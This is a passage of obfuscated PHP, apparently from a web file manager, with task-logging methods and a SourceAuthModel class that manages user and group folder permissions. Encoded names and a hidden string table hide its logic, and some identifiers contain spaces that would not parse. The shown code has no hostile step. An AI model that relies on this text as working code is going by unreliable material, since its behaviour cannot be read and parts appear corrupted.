$‡ÔÜû´¸[8] . $òéÛºˆå[$‡ÔÜû´¸[1165]] . LNG($‡ÔÜû´¸[2018]); $…Òë˜ÏÊ = $‡ÔÜû´¸[12]; if ($òéÛºˆå[$‡ÔÜû´¸[2002]]) { $‚ÖöÇŒ‚ = $äòÅÕì¢ . size_format($òéÛºˆå[$‡ÔÜû´¸[1916]]) . $‡ÔÜû´¸[8] . size_format($òéÛºˆå[$‡ÔÜû´¸[1165]]); $…Òë˜ÏÊ = size_format($òéÛºˆå[$‡ÔÜû´¸[1918]]) . $‡ÔÜû´¸[2019]; } if ($òéÛºˆå[$‡ÔÜû´¸[1167]]) { $òéÛºˆå[$‡ÔÜû´¸[1967]] = $òéÛºˆå[$‡ÔÜû´¸[1167]] . $‡ÔÜû´¸[53] . $òéÛºˆå[$‡ÔÜû´¸[1967]]; } if ($òéÛºˆå[$‡ÔÜû´¸[1967]]) { $šòŠıÚ = $‡ÔÜû´¸[12]; if ($òéÛºˆå[$‡ÔÜû´¸[1969]]) { $šòŠıÚ = $‡ÔÜû´¸[50] . size_format($òéÛºˆå[$‡ÔÜû´¸[1970]]) . $‡ÔÜû´¸[8] . size_format($òéÛºˆå[$‡ÔÜû´¸[1969]]); } $…Òë˜ÏÊ .= $òéÛºˆå[$‡ÔÜû´¸[1967]] . $šòŠıÚ; } if ($òéÛºˆå[$‡ÔÜû´¸[847]] && !$òéÛºˆå[$‡ÔÜû´¸[1969]]) { $…Òë˜ÏÊ .= $‡ÔÜû´¸[53] . size_format($òéÛºˆå[$‡ÔÜû´¸[1974]]) . $‡ÔÜû´¸[8] . size_format($òéÛºˆå[$‡ÔÜû´¸[847]]); } echoLog($‚ÖöÇŒ‚ . $‡ÔÜû´¸[53] . $…Òë˜ÏÊ, !0); } public function taskEnd($ó¹ÀÊ¶ ) { $Œ©ÜÈ£õ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ó¹ÀÊ¶  || $this->taskID != $ó¹ÀÊ¶ [$Œ©ÜÈ£õ[483]]) { return; } $÷ó¢‰›° = $ó¹ÀÊ¶  ? LNG($Œ©ÜÈ£õ[2020]) . $Œ©ÜÈ£õ[4] . $ó¹ÀÊ¶ [$Œ©ÜÈ£õ[1916]] . $Œ©ÜÈ£õ[8] . $ó¹ÀÊ¶ [$Œ©ÜÈ£õ[1165]] . LNG($Œ©ÜÈ£õ[2018]) . $Œ©ÜÈ£õ[74] : $Œ©ÜÈ£õ[12]; echoLog($Œ©ÜÈ£õ[2021] . $ó¹ÀÊ¶ [$Œ©ÜÈ£õ[1802]] . ($ó¹ÀÊ¶ [$Œ©ÜÈ£õ[536]] ? $Œ©ÜÈ£õ[74] . $ó¹ÀÊ¶ [$Œ©ÜÈ£õ[536]] : $Œ©ÜÈ£õ[12]) . $Œ©ÜÈ£õ[74] . $÷ó¢‰›° . $Œ©ÜÈ£õ[2022] . sprintf($Œ©ÜÈ£õ[946], timeFloat() - $ó¹ÀÊ¶ [$Œ©ÜÈ£õ[1919]]) . $Œ©ÜÈ£õ[1931]); $this->end(); } public function taskKill($–˜ƒ¨áø) { $ŸÈÃÃôµ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$–˜ƒ¨áø || $this->taskID != $–˜ƒ¨áø[$ŸÈÃÃôµ[483]]) { return; } echoLog($ŸÈÃÃôµ[2023] . $–˜ƒ¨áø[$ŸÈÃÃôµ[1802]]); } } goto Fƒ»©Ñ¨Á¹; c…°´ãŠÖĞ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\143\x65\x5f\x61\165\x74\150"; public function getAuth($¦í˜ºèÓ) { $‘ĞµÉŞŞ =& $_SERVER[¿ÈˆÑ¸ä]; $Ç´˜öÃ = $this->sourceAuthSelect($¦í˜ºèÓ); $«ç¡ÄÃİ = array(); $ÜåµÉ•Ë = array(); $Êı„œŸæ = 2 << 25; foreach ($Ç´˜öÃ as $€îúûÃ) { $Ù„ìê£ = Model($‘ĞµÉŞŞ[587])->listData($€îúûÃ[$‘ĞµÉŞŞ[1576]]); if (!$Ù„ìê£) { continue; } $«ç¡ÄÃİ[] = $€îúûÃ; $¡Ô÷á§ù = 0; if ($€îúûÃ[$‘ĞµÉŞŞ[189]] == SourceModel::TYPE_GROUP) { $¡Ô÷á§ù = $Êı„œŸæ * 2; } if ($€îúûÃ[$‘ĞµÉŞŞ[189]] == SourceModel::TYPE_USER) { $¡Ô÷á§ù = $Êı„œŸæ; } if ($€îúûÃ[$‘ĞµÉŞŞ[189]] == SourceModel::TYPE_USER && $€îúûÃ[$‘ĞµÉŞŞ[585]] == $‘ĞµÉŞŞ[229]) { $¡Ô÷á§ù = 0; } $ÜåµÉ•Ë[] = $Ù„ìê£[$‘ĞµÉŞŞ[498]] + $¡Ô÷á§ù; } array_multisort($ÜåµÉ•Ë, SORT_DESC, $«ç¡ÄÃİ); return $«ç¡ÄÃİ; } public function sourceAuthSelect($˜ù‘ë½) { $ú§ÀÉÕ§ =& $_SERVER[¿ÈˆÑ¸ä]; static $ğ¸İşß = array(); $³íş‘×Ì = is_array($˜ù‘ë½) ? !1 : !0; if ($³íş‘×Ì) { $˜ù‘ë½ = array($˜ù‘ë½); } $ËüÄ¹ = array(); foreach ($˜ù‘ë½ as $­£™¯Ç) { if (isset($ğ¸İşß[$­£™¯Ç])) { $ËüÄ¹[$­£™¯Ç] = $ğ¸İşß[$­£™¯Ç]; } } if (count($ËüÄ¹) == count($˜ù‘ë½)) { return $³íş‘×Ì ? $ËüÄ¹[$˜ù‘ë½[0]] : $ËüÄ¹; } $¸­¯ÄÒÎ = $ú§ÀÉÕ§[2305]; $¬ŸòÈ­ = array($ú§ÀÉÕ§[192] => array($ú§ÀÉÕ§[7], $˜ù‘ë½)); $ºæÈÆÊ = $this->field($¸­¯ÄÒÎ)->order($ú§ÀÉÕ§[483])->where($¬ŸòÈ­)->select(); $ÈË‡½‘ = array_to_keyvalue_group($ºæÈÆÊ, $ú§ÀÉÕ§[192]); foreach ($˜ù‘ë½ as $­£™¯Ç) { $ğ¸İşß[$­£™¯Ç] = $ÈË‡½‘[$­£™¯Ç] ? $ÈË‡½‘[$­£™¯Ç] : array(); } if ($³íş‘×Ì) { return $ºæÈÆÊ; } return $ÈË‡½‘; } public function setAuth($’·âØó, $¥ˆÖĞœ) { $ŒÃ€ö™‘ =& $_SERVER[¿ÈˆÑ¸ä]; $´İïÃÊ… = Model($ŒÃ€ö™‘[1469])->sourceInfo($’·âØó); if (!$´İïÃÊ…) { return !1; } if ($´İïÃÊ…[$ŒÃ€ö™‘[189]] != SourceModel::TYPE_GROUP) { return !1; } $æ§Œ½ôğ = 1; $ÜÔÃÓÉÓ = $´İïÃÊ…[$ŒÃ€ö™‘[585]]; if ($ÜÔÃÓÉÓ != $æ§Œ½ôğ) { $ø½…ú¯” = array($ŒÃ€ö™‘[1431] => $ÜÔÃÓÉÓ); $©ÅÍéâë = Model($ŒÃ€ö™‘[2214])->field($ŒÃ€ö™‘[1529])->where($ø½…ú¯”)->select(); $©ÅÍéâë = array_to_keyvalue($©ÅÍéâë, $ŒÃ€ö™‘[12], $ŒÃ€ö™‘[1529]); } $…¿«¢Ä = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $§ÔÑÇ¡ª = array(); foreach ($¥ˆÖĞœ as $¹ñ®í·¨) { if (!in_array($¹ñ®í·¨[$ŒÃ€ö™‘[189]], $…¿«¢Ä)) { show_json(LNG($ŒÃ€ö™‘[2306]), !1); } if ($ÜÔÃÓÉÓ != $æ§Œ½ôğ) { if ($¹ñ®í·¨[$ŒÃ€ö™‘[189]] == SourceModel::TYPE_GROUP) { } if ($¹ñ®í·¨[$ŒÃ€ö™‘[585]] != 0 && !in_array($¹ñ®í·¨[$ŒÃ€ö™‘[585]], $©ÅÍéâë)) { } } if ($¹ñ®í·¨[$ŒÃ€ö™‘[585]] == 0) { $¹ñ®í·¨[$ŒÃ€ö™‘[189]] = SourceModel::TYPE_USER; } $§ÔÑÇ¡ª[] = array($ŒÃ€ö™‘[192] => $’·âØó, $ŒÃ€ö™‘[189] => intval($¹ñ®í·¨[$ŒÃ€ö™‘[189]]), $ŒÃ€ö™‘[585] => intval($¹ñ®í·¨[$ŒÃ€ö™‘[585]]), $ŒÃ€ö™‘[1576] => intval($¹ñ®í·¨[$ŒÃ€ö™‘[1576]]) ? intval($¹ñ®í·¨[$ŒÃ€ö™‘[1576]]) : 0, $ŒÃ€ö™‘[2284] => intval($¹ñ®í·¨[$ŒÃ€ö™‘[2284]]) ? intval($¹ñ®í·¨[$ŒÃ€ö™‘[2284]]) : -1); } $this->where(array($ŒÃ€ö™‘[502] => $’·âØó))->delete(); $this->addAll($§ÔÑÇ¡ª); return !0; } public function authClear($¬¯Àúöû) { $¾§Ôª =& $_SERVER[¿ÈˆÑ¸ä]; $‰şİÏŠã = Model($¾§Ôª[1469])->sourceInfo($¬¯Àúöû); $†…ÆØ“Ù = array($¬¯Àúöû); if ($‰şİÏŠã[$¾§Ôª[496]] == $¾§Ôª[91]) { $ëóè‡ı = array($¾§Ôª[671] => array($¾§Ôª[631], $‰şİÏŠã[$¾§Ôª[600]] . $¬¯Àúöû . $¾§Ôª[632])); $†…ÆØ“Ù = Model($¾§Ôª[1469])->field($¾§Ôª[502])->where($ëóè‡ı)->getField($¾§Ôª[192], !0); $†…ÆØ“Ù[] = $¬¯Àúöû; } $this->where(array($¾§Ôª[502] => array($¾§Ôª[503], $†…ÆØ“Ù)))->delete(); return !0; } public function getAllParent($×›È¾Û¡) { $õûí§´á =& $_SERVER[¿ÈˆÑ¸ä]; $øÚÃ©¸Ü = Model($õûí§´á[1469])->sourceInfo($×›È¾Û¡); if (!$øÚÃ©¸Ü || $øÚÃ©¸Ü[$õûí§´á[189]] != SourceModel::TYPE_GROUP) { return array(); } $ŒÎšÖ‹¿ = Model($õûí§´á[1469])->parentLevelArray($øÚÃ©¸Ü[$õûí§´á[600]]); $Ïˆ«ÎÜö = array_merge(array(intval($×›È¾Û¡)), array_reverse($ŒÎšÖ‹¿)); $ˆ±¨ñÒä = $this->sourceAuthSelect($Ïˆ«ÎÜö); $§Âøˆœ = $GLOBALS[$õûí§´á[6]][$õûí§´á[92]][$õûí§´á[2227]] == 1; $¯×Öè‡° = $§Âøˆœ ? 3 : 2; $Ğš“¬­ = Model($õûí§´á[1429])->getInfo($øÚÃ©¸Ü[$õûí§´á[585]]); $¢´¥¦£¹ = explode($õûí§´á[50], trim($Ğš“¬­[$õûí§´á[600]], $õûí§´á[50])); $ÈŸÇÓÕË = array_merge(array($Ğš“¬­[$õûí§´á[1431]]), array_reverse(array_slice($¢´¥¦£¹, $¯×Öè‡°))); foreach ($ˆ±¨ñÒä as $×›È¾Û¡ => $âõ¸ã£Á) { foreach ($âõ¸ã£Á as $›ŞÇòÄµ) { if (!$›ŞÇòÄµ || !$›ŞÇòÄµ[$õûí§´á[585]] || $›ŞÇòÄµ[$õûí§´á[585]] == $õûí§´á[229]) { continue; } if ($›ŞÇòÄµ[$õûí§´á[189]] != SourceModel::TYPE_GROUP) { continue; } $ÈŸÇÓÕË[] = $›ŞÇòÄµ[$õûí§´á[585]]; } } $ÈŸÇÓÕË = array_unique($ÈŸÇÓÕË); $³Ò£ç = array($õûí§´á[429] => _get($GLOBALS[$õûí§´á[7]], $õûí§´á[429], 1), $õûí§´á[440] => _get($GLOBALS[$õûí§´á[7]], $õûí§´á[440], 500)); $GLOBALS[$õûí§´á[7]][$õûí§´á[429]] = 1; $GLOBALS[$õûí§´á[7]][$õûí§´á[440]] = 500; $áË‹ÖÃä = array($õûí§´á[504] => 0, $õûí§´á[2128] => AuthModel::authAll(), $õûí§´á[505] => LNG($õûí§´á[2307]), $õûí§´á[2143] => $õûí§´á[2308]); $¥À˜‘ÌÒ = array(); $–÷ŞÇûÒ = explode($õûí§´á[50], $õûí§´á[2309]); $Šİòöş¶ = explode($õûí§´á[50], $õûí§´á[2310]); foreach ($ÈŸÇÓÕË as $ú¿ÙùÀ) { $Œ·À†…é = Model($õûí§´á[1429])->getInfo($ú¿ÙùÀ); $ç÷öË‹¨ = array_field_key($Œ·À†…é, $–÷ŞÇûÒ); $Å°‚¼‡ = Model($õûí§´á[613])->listByGroup($ú¿ÙùÀ); foreach ($Å°‚¼‡[$õûí§´á[446]] as $Š¨ãƒ›° => $ğÀ¨¬ü) { $this->userGroupList($ğÀ¨¬ü[$õûí§´á[1529]], $ğÀ¨¬ü); $÷ÃÔä‘Â = $ğÀ¨¬ü[$õûí§´á[1529]] . $õûí§´á[12]; if (isset($¥À˜‘ÌÒ[$÷ÃÔä‘Â])) { continue; } $¡ÊÖåÒÈ = Model($õûí§´á[2311])->listData($ğÀ¨¬ü[$õûí§´á[2312]]); $ğÀ¨¬ü[$õûí§´á[2313]] = Action($õûí§´á[2314])->parseUrl($ğÀ¨¬ü[$õûí§´á[2313]]); $ğÀ¨¬ü[$õûí§´á[1881]] = $¡ÊÖåÒÈ && $¡ÊÖåÒÈ[$õûí§´á[2315]] == 1; $˜Ê·–· = $this->groupRootAuth($ú¿ÙùÀ, $ğÀ¨¬ü[$õûí§´á[1529]]); $˜Ê·–· = $ğÀ¨¬ü[$õûí§´á[1881]] ? $áË‹ÖÃä : $˜Ê·–·; $¥À˜‘ÌÒ[$÷ÃÔä‘Â] = array($õûí§´á[2316] => $õûí§´á[2317], $õûí§´á[2318] => LNG($õûí§´á[2319]), $õûí§´á[2296] => array_field_key($ğÀ¨¬ü, $Šİòöş¶), $õûí§´á[498] => $˜Ê·–·, $õûí§´á[499] => $˜Ê·–·[$õûí§´á[498]], $õûí§´á[2320] => $ç÷öË‹¨); } } $GLOBALS[$õûí§´á[7]][$õûí§´á[429]] = $³Ò£ç[$õûí§´á[429]]; $GLOBALS[$õûí§´á[7]][$õûí§´á[440]] = $³Ò£ç[$õûí§´á[440]]; foreach ($ˆ±¨ñÒä as $×›È¾Û¡ => $âõ¸ã£Á) { if (!$âõ¸ã£Á) { continue; } foreach ($âõ¸ã£Á as $›ŞÇòÄµ) { if (!$›ŞÇòÄµ || !$›ŞÇòÄµ[$õûí§´á[585]] || $›ŞÇòÄµ[$õûí§´á[585]] == $õûí§´á[229]) { continue; } if ($›ŞÇòÄµ[$õûí§´á[189]] != SourceModel::TYPE_USER) { continue; } $÷ÃÔä‘Â = $›ŞÇòÄµ[$õûí§´á[585]] . $õûí§´á[12]; if (isset($¥À˜‘ÌÒ[$÷ÃÔä‘Â])) { continue; } $ªÏ´Ûú = $this->authMake($âõ¸ã£Á, $÷ÃÔä‘Â); if (!$ªÏ´Ûú || !$ªÏ´Ûú[$õûí§´á[2318]]) { continue; } $¥À˜‘ÌÒ[$÷ÃÔä‘Â] = array($õûí§´á[2316] => $õûí§´á[2321], $õûí§´á[2318] => $ªÏ´Ûú[$õûí§´á[2318]], $õûí§´á[2296] => Model($õûí§´á[613])->getInfoSimpleOuter($÷ÃÔä‘Â), $õûí§´á[498] => $ªÏ´Ûú[$õûí§´á[552]], $õûí§´á[499] => $ªÏ´Ûú[$õûí§´á[552]][$õûí§´á[498]], $õûí§´á[2320] => $ªÏ´Ûú[$õûí§´á[2322]]); } } foreach ($ˆ±¨ñÒä as $×›È¾Û¡ => $âõ¸ã£Á) { if (!$âõ¸ã£Á) { continue; } foreach ($¥À˜‘ÌÒ as $÷ÃÔä‘Â => $ñÃ‹ò€ß) { if ($ñÃ‹ò€ß[$õûí§´á[2296]][$õûí§´á[1881]] || $ñÃ‹ò€ß[$õûí§´á[2316]] == $õûí§´á[2321]) { continue; } $ªÏ´Ûú = $this->authMake($âõ¸ã£Á, $÷ÃÔä‘Â); if (!$ªÏ´Ûú || !$ªÏ´Ûú[$õûí§´á[2318]]) { continue; } $¥À˜‘ÌÒ[$÷ÃÔä‘Â] = array($õûí§´á[2316] => $õûí§´á[2321], $õûí§´á[2318] => $ªÏ´Ûú[$õûí§´á[2318]], $õûí§´á[2296] => $ñÃ‹ò€ß[$õûí§´á[2296]], $õûí§´á[498] => $ªÏ´Ûú[$õûí§´á[552]], $õûí§´á[499] => $ªÏ´Ûú[$õûí§´á[552]][$õûí§´á[498]], $õûí§´á[2320] => $ªÏ´Ûú[$õûí§´á[2322]]); } } $¥À˜‘ÌÒ = array_sort_by($¥À˜‘ÌÒ, $õûí§´á[499], $õûí§´á[536]); return $¥À˜‘ÌÒ; } public function getAllChildren($“¬Ã¥©«) { $ãÌÀ…¯ =& $_SERVER[¿ÈˆÑ¸ä]; $›Ôß¬ä = Model($ãÌÀ…¯[1469])->sourceInfo($“¬Ã¥©«); if ($›Ôß¬ä[$ãÌÀ…¯[496]] != $ãÌÀ…¯[91]) { return $this->sourceListAuth(array($“¬Ã¥©«)); } if ($›Ôß¬ä[$ãÌÀ…¯[189]] != SourceModel::TYPE_GROUP) { return array(); } $¿üÍĞİŸ = 1; $´İ•êÙÒ = array($“¬Ã¥©«); if ($›Ôß¬ä[$ãÌÀ…¯[191]] == $ãÌÀ…¯[229] && $›Ôß¬ä[$ãÌÀ…¯[585]] != $¿üÍĞİŸ) { $´İ•êÙÒ = $this->groupChidldAllRootSource($›Ôß¬ä[$ãÌÀ…¯[585]]); } $ùª¹ÈÁÏ = $this->field($ãÌÀ…¯[192])->group($ãÌÀ…¯[192])->select(); $ùª¹ÈÁÏ = array_to_keyvalue($ùª¹ÈÁÏ, $ãÌÀ…¯[12], $ãÌÀ…¯[192]); if (!$ùª¹ÈÁÏ) { return array(); } $õœ‘ÓŸ„ = $ãÌÀ…¯[2323]; $Á¹ÑÈ¹ = array($ãÌÀ…¯[192] => array($ãÌÀ…¯[7], $ùª¹ÈÁÏ), $ãÌÀ…¯[516] => $ãÌÀ…¯[229]); $ƒÀÃ™Ù× = Model($ãÌÀ…¯[916])->field($õœ‘ÓŸ„)->where($Á¹ÑÈ¹)->select(); $„ÒõÍÅ´ = array($“¬Ã¥©«); foreach ($ƒÀÃ™Ù× as $¨ñú˜äİ) { foreach ($´İ•êÙÒ as $ôº¬¤¢†) { $ææ»ó = $ãÌÀ…¯[50] . $ôº¬¤¢† . $ãÌÀ…¯[50]; $ß•Ğ‚ø¯ = $¨ñú˜äİ[$ãÌÀ…¯[600]] . $¨ñú˜äİ[$ãÌÀ…¯[192]] . $ãÌÀ…¯[50]; if (strstr($ß•Ğ‚ø¯, $ææ»ó)) { $„ÒõÍÅ´[] = $¨ñú˜äİ[$ãÌÀ…¯[192]]; break; } } } return $this->sourceListAuth($„ÒõÍÅ´); } private function sourceListAuth($´ı’Â™») { $›Ø€¢÷Ú =& $_SERVER[¿ÈˆÑ¸ä]; $“Æ™ – = Model($›Ø€¢÷Ú[1469])->sourceListInfo($´ı’Â™», !0); $›Ô™•È† = $this->sourceAuthSelect($´ı’Â™»); $ÖëÆ½ÅÔ = array(); $Æâ´§¶ = array(); foreach ($“Æ™ – as $õÃ°£™µ) { unset($õÃ°£™µ[$›Ø€¢÷Ú[539]]); unset($õÃ°£™µ[$›Ø€¢÷Ú[537]]); unset($õÃ°£™µ[$›Ø€¢÷Ú[498]]); unset($õÃ°£™µ[$›Ø€¢÷Ú[90]]); $£¯Ë±šº = $›Ô™•È†[$õÃ°£™µ[$›Ø€¢÷Ú[192]]]; if (!$£¯Ë±šº) { continue; } $õÃ°£™µ[$›Ø€¢÷Ú[2320]] = $this->authTargetInfo($£¯Ë±šº); $õÃ°£™µ[$›Ø€¢÷Ú[598]] = rtrim($õÃ°£™µ[$›Ø€¢÷Ú[604]], $›Ø€¢÷Ú[8]) . $›Ø€¢÷Ú[8] . ltrim($õÃ°£™µ[$›Ø€¢÷Ú[598]], $›Ø€¢÷Ú[8]); $ÖëÆ½ÅÔ[] = $õÃ°£™µ; $ßÊêğ¹¿ = count(explode($›Ø€¢÷Ú[8], trim($õÃ°£™µ[$›Ø€¢÷Ú[598]], $›Ø€¢÷Ú[8]))); $Æâ´§¶[] = $ßÊêğ¹¿ + ($õÃ°£™µ[$›Ø€¢÷Ú[33]] == $›Ø€¢÷Ú[78] ? 0 : 1000); } array_multisort($Æâ´§¶, SORT_ASC, $ÖëÆ½ÅÔ); return $ÖëÆ½ÅÔ; } private function groupChidldAllRootSource($ĞÜŠ§ğ) { $¢İú‚È× =& $_SERVER[¿ÈˆÑ¸ä]; $í°ùÙÜë = Model($¢İú‚È×[1429])->groupChildrenAll($ĞÜŠ§ğ); $¸Šï„† = array($¢İú‚È×[191] => 0, $¢İú‚È×[585] => array($¢İú‚È×[7], $í°ùÙÜë), $¢İú‚È×[189] => SourceModel::TYPE_GROUP); $µµØˆ¼ì = Model($¢İú‚È×[916])->field($¢İú‚È×[192])->where($¸Šï„†)->select(); $µµØˆ¼ì = array_to_keyvalue($µµØˆ¼ì, $¢İú‚È×[12], $¢İú‚È×[192]); return $µµØˆ¼ì; } private function authTargetInfo($ıåİøÑÖ) { $ÛÑÓ‡¤ƒ =& $_SERVER[¿ÈˆÑ¸ä]; $¢ÇŒû¼± = array(); $Åú¾²£ = array(); $¤õ€°Ê = 2 << 25; foreach ($ıåİøÑÖ as $®Ä™üôÓ) { $‰ºåº¤¸ = Model($ÛÑÓ‡¤ƒ[587])->listData($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[1576]]); if (!$‰ºåº¤¸) { continue; } if ($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[189]] == SourceModel::TYPE_USER) { $í†úş«‘ = Model($ÛÑÓ‡¤ƒ[593])->getInfoSimpleOuter($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[585]]); if ($í†úş«‘[$ÛÑÓ‡¤ƒ[1529]] == $ÛÑÓ‡¤ƒ[1313]) { continue; } if ($í†úş«‘[$ÛÑÓ‡¤ƒ[1529]] == $ÛÑÓ‡¤ƒ[229]) { $í†úş«‘[$ÛÑÓ‡¤ƒ[32]] = LNG($ÛÑÓ‡¤ƒ[2324]); } } else { $í†úş«‘ = Model($ÛÑÓ‡¤ƒ[601])->getInfoSimple($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[585]]); } if (!$í†úş«‘) { continue; } $í†úş«‘[$ÛÑÓ‡¤ƒ[552]] = $‰ºåº¤¸; $¢ÇŒû¼±[] = $í†úş«‘; $«±©ø› = 0; if ($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[189]] == SourceModel::TYPE_GROUP) { $«±©ø› = $¤õ€°Ê * 2; } if ($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[189]] == SourceModel::TYPE_USER) { $«±©ø› = $¤õ€°Ê; } if ($®Ä™üôÓ[$ÛÑÓ‡¤ƒ[189]] == SourceModel::TYPE_USER && $®Ä™üôÓ[$ÛÑÓ‡¤ƒ[585]] == $ÛÑÓ‡¤ƒ[229]) { $«±©ø› = 0; } $Åú¾²£[] = $‰ºåº¤¸[$ÛÑÓ‡¤ƒ[498]] + $«±©ø›; } array_multisort($Åú¾²£, SORT_DESC, $¢ÇŒû¼±); return $¢ÇŒû¼±; } public function getAllChildrenByUser($¤Û± êÃ, $Šî—¨Áü) { $™à”ìœÏ =& $_SERVER[¿ÈˆÑ¸ä]; $ï¼«¥¿¼ = Model($™à”ìœÏ[613])->getInfo($Šî—¨Áü); if (!$Šî—¨Áü || !$¤Û± êÃ || !$ï¼«¥¿¼) { return array(); } $ğ¥ïÎìŞ = Model($™à”ìœÏ[1469])->sourceInfo($¤Û± êÃ); $§ªÅ¡ƒ¸ = array(); $íİûÄùû = 1; if ($ğ¥ïÎìŞ[$™à”ìœÏ[191]] == $™à”ìœÏ[229] && $ğ¥ïÎìŞ[$™à”ìœÏ[585]] != $íİûÄùû && $this->groupContainUser($ğ¥ïÎìŞ[$™à”ìœÏ[585]], $Šî—¨Áü)) { foreach ($ï¼«¥¿¼[$™à”ìœÏ[1430]] as $µ½á°è¸) { $…ÚŞïÛ† = Model($™à”ìœÏ[601])->getInfo($µ½á°è¸[$™à”ìœÏ[1431]]); $ï³Æú¥¤ = Model($™à”ìœÏ[613])->getInfoSimpleOuter($Šî—¨Áü); $ï³Æú¥¤[$™à”ìœÏ[552]] = $µ½á°è¸[$™à”ìœÏ[498]]; if (Model($™à”ìœÏ[587])->authCheckAction($µ½á°è¸[$™à”ìœÏ[498]][$™à”ìœÏ[498]], $™à”ìœÏ[1501])) { continue; } $®–Ìñ = array($™à”ìœÏ[32] => $™à”ìœÏ[1332] . $…ÚŞïÛ†[$™à”ìœÏ[32]], $™à”ìœÏ[192] => $…ÚŞïÛ†[$™à”ìœÏ[90]][$™à”ìœÏ[192]], $™à”ìœÏ[87] => KodIO::make($…ÚŞïÛ†[$™à”ìœÏ[90]][$™à”ìœÏ[192]]), $™à”ìœÏ[191] => $™à”ìœÏ[229], $™à”ìœÏ[189] => $™à”ìœÏ[594], $™à”ìœÏ[33] => $™à”ìœÏ[635], $™à”ìœÏ[598] => $…ÚŞïÛ†[$™à”ìœÏ[605]], $™à”ìœÏ[1431] => $…ÚŞïÛ†[$™à”ìœÏ[1431]], $™à”ìœÏ[602] => $…ÚŞïÛ†[$™à”ìœÏ[191]], $™à”ìœÏ[2320] => array($ï³Æú¥¤)); $§ªÅ¡ƒ¸[$®–Ìñ[$™à”ìœÏ[192]]] = $®–Ìñ; } } $Êƒüßñ¡ = array(); $›¸º£å± = $this->getAllChildren($¤Û± êÃ); foreach ($›¸º£å± as $¶º“»¦ä) { $ŞÈ¸Ú– = !1; foreach ($¶º“»¦ä[$™à”ìœÏ[2320]] as $¾‚å€‘ê) { if ($¾‚å€‘ê[$™à”ìœÏ[1529]]) { if ($¾‚å€‘ê[$™à”ìœÏ[1529]] == $Šî—¨Áü) { $ŞÈ¸Ú– = !0; break; } } if ($¾‚å€‘ê[$™à”ìœÏ[1431]]) { if ($this->groupContainUser($¾‚å€‘ê[$™à”ìœÏ[1431]], $Šî—¨Áü)) { $ŞÈ¸Ú– = !0; break; } } } if ($ŞÈ¸Ú–) { $Êƒüßñ¡[] = $¶º“»¦ä; } $óåù¾Ÿµ = $¶º“»¦ä[$™à”ìœÏ[192]]; if (isset($§ªÅ¡ƒ¸[$óåù¾Ÿµ])) { $¶º“»¦ä[$™à”ìœÏ[2320]][] = $§ªÅ¡ƒ¸[$óåù¾Ÿµ][0]; $§ªÅ¡ƒ¸[$óåù¾Ÿµ] = !1; } } $§ªÅ¡ƒ¸ = array_filter(array_values($§ªÅ¡ƒ¸)); $Êƒüßñ¡ = array_merge($§ªÅ¡ƒ¸, $Êƒüßñ¡); return $Êƒüßñ¡; } public function setAllChildrenByUser($±ÌùËİ›, $û¿ğúôÂ, $‹ÈóÏıÉ) { $•îÒÓİë =& $_SERVER[¿ÈˆÑ¸ä]; $¾¿”Ù÷€ = $this->getAllChildrenByUser($±ÌùËİ›, $û¿ğúôÂ); if (!$‹ÈóÏıÉ || !$¾¿”Ù÷€) { return !1; } foreach ($¾¿”Ù÷€ as $ÔúıšØ‰) { $…µèÎ¾Ú = array(); foreach ($ÔúıšØ‰[$•îÒÓİë[2320]] as $Àš–ûâ) { $ûï•»òµ = $Àš–ûâ[$•îÒÓİë[552]]; $÷ôÍˆ¯À = $Àš–ûâ[$•îÒÓİë[1529]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $…¾¿„ş• = $Àš–ûâ[$•îÒÓİë[1529]] ? $Àš–ûâ[$•îÒÓİë[1529]] : $Àš–ûâ[$•îÒÓİë[1431]]; if ($Àš–ûâ[$•îÒÓİë[1529]] && $Àš–ûâ[$•îÒÓİë[1529]] == $û¿ğúôÂ) { continue; } $…µèÎ¾Ú[] = array($•îÒÓİë[192] => $ÔúıšØ‰[$•îÒÓİë[192]], $•îÒÓİë[189] => $÷ôÍˆ¯À, $•îÒÓİë[585] => intval($…¾¿„ş•), $•îÒÓİë[1576] => isset($ûï•»òµ[$•îÒÓİë[483]]) ? intval($ûï•»òµ[$•îÒÓİë[483]]) : 0, $•îÒÓİë[2284] => isset($ûï•»òµ[$•îÒÓİë[2284]]) ? intval($ûï•»òµ[$•îÒÓİë[2284]]) : -1); } $…µèÎ¾Ú[] = array($•îÒÓİë[192] => $ÔúıšØ‰[$•îÒÓİë[192]], $•îÒÓİë[189] => SourceModel::TYPE_USER, $•îÒÓİë[585] => intval($û¿ğúôÂ), $•îÒÓİë[1576] => intval($‹ÈóÏıÉ), $•îÒÓİë[2284] => -1); $this->where(array($•îÒÓİë[502] => $ÔúıšØ‰[$•îÒÓİë[192]]))->delete(); $this->addAll($…µèÎ¾Ú); } return !0; } public function get($«çİÃ»») { $™Ğœğêô = $this->getSourceList(array($«çİÃ»»), !0); return $™Ğœğêô[0]; } public function getSourceList($Óù†õêû, $¸°áÒÀ€ = false, $Ñ¦ù³¤í = false) { $ó†çˆ±Š =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Óù†õêû) { return array(); } $ëÈíšâª = Model($ó†çˆ±Š[1469]); if (!$¸°áÒÀ€ && count($Óù†õêû) == 1) { $¸°áÒÀ€ = array(); $¸°áÒÀ€[$Óù†õêû[0]] = $ëÈíšâª->sourceInfo($Óù†õêû[0]); } if (!$¸°áÒÀ€) { $¼ÙìÌÉ¢ = array($ó†çˆ±Š[502] => array($ó†çˆ±Š[503], $Óù†õêû)); $¸°áÒÀ€ = $ëÈíšâª->field($ó†çˆ±Š[2325])->where($¼ÙìÌÉ¢)->select(); $¸°áÒÀ€ = array_to_keyvalue($¸°áÒÀ€, $ó†çˆ±Š[192]); } $Ú¶‹«—› = $Óù†õêû; foreach ($¸°áÒÀ€ as $¥‰î‡ãí => $ñÎÁ°Û¬) { $ó³Îêøğ = $ëÈíšâª->parentLevelArray($ñÎÁ°Û¬[$ó†çˆ±Š[600]]); $Ú¶‹«—› = 